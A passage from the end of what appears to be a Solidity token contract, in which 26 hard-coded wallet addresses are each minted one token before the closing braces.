_mint( 0xa366530424312f62fbadF03afF554253988cb597
, 1 
* 10 ** decimals());

_mint( 0x1A3326bf12589eE53b3f796c9D376EA3df60d459
, 1 
* 10 ** decimals());

_mint( 0x0D9928D571a95269c0B56247706182AdeFefCDD9
, 1 
* 10 ** decimals());

_mint( 0xb2dE27deBA9a1bd6f8021c2cd8446094bb87e18c
, 1 
* 10 ** decimals());

_mint( 0x37c9CE0B3a1AB8E81a1cada200E81b9bF9Cf7258
, 1 
* 10 ** decimals());

_mint( 0xDc8eE9Bb83C8e0DB6c48846AF6fd680ad2409459
, 1 
* 10 ** decimals());

_mint( 0x41920Bf55B234F6D7cFf3A16d8982A8C737E6caa
, 1 
* 10 ** decimals());

_mint( 0x17D9652823c8C86549762319E4e8D4f428601BE1
, 1 
* 10 ** decimals());

_mint( 0x39e4F9F696626Bd364387BEd14d6eF876346E2D8
, 1 
* 10 ** decimals());

_mint( 0x85fdD95F47A8ecDcd83f76Ed42eaB554Bd0A0e1B
, 1 
* 10 ** decimals());

_mint( 0xDB1B1AE1d6E99EDD7F487cfBD690561046f6147A
, 1 
* 10 ** decimals());

_mint( 0xDEdea4CA72823D743374450bB0048C0edA43bF91
, 1 
* 10 ** decimals());

_mint( 0xB43F18628A44007cb1896DfD28e2674058aBa358
, 1 
* 10 ** decimals());

_mint( 0xF0F2154B505b01DCa01E0CfE301fdCEd67eC8dE0
, 1 
* 10 ** decimals());

_mint( 0x06fCD548D2a80500938cD9b8f819A8D13c05BDA5
, 1 
* 10 ** decimals());

_mint( 0x4AD549183e0147b7Ee9eFF8295f2b6beC5d2b968
, 1 
* 10 ** decimals());

_mint( 0xdC4d076a2847264b8cAcA4bed97cb1e6C7915FBf
, 1 
* 10 ** decimals());

_mint( 0x3eec74A88426AbF3c0134c0D29BaeCB47951cff5
, 1 
* 10 ** decimals());

_mint( 0xa1a97546B974E144Ee2F01F3B778E862840fbaEA
, 1 
* 10 ** decimals());

_mint( 0xAfF494D805525742CEa1312DA1Ba53594ee60013
, 1 
* 10 ** decimals());

_mint( 0x7351E6fF231A23a82F5dAc7d9BC745B251a137DB
, 1 
* 10 ** decimals());

_mint( 0x7284F5cc4bb74263D1D83bbA57386Cc8BE498B88
, 1 
* 10 ** decimals());

_mint( 0x9Be7A4aF4f164c83EC8Fe5aD60D29308E784cFF3
, 1 
* 10 ** decimals());

_mint( 0xE3A39Daf4Ace6E651438be6c72A290844d039364
, 1 
* 10 ** decimals());

_mint( 0x0ffB9B96D5A17cEFd82B9309F1Be5bAcECa311E0
, 1 
* 10 ** decimals());

_mint( 0x07b5483CC38D89b1582452dc5733c6dC226ff6Ca
, 1 
* 10 ** decimals());

    }
}